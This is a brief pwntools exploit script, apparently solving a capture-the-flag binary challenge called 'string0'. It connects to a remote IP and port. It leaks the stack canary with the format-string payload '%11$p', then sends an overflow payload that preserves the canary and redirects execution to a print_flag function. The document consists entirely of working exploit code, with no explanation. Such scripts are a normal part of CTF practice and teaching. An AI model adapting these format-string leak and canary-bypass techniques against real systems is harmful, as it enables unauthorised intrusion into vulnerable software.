#!/usr/bin/env python3



from pwn import *

e = ELF("./string0_patched")
#r = process("./string0_patched")
r = remote("107.191.51.129",5001)
canary_leaker = b'%11$p'
r.sendline(canary_leaker)
r.recvuntil("What is your favorite format string?\n")
canary = int(r.recvline().strip(),16)
exploit = b'A' * 16 + p32(canary) + b'A' * 12 + p32(e.sym.print_flag)
r.sendline(exploit)
r.interactive()
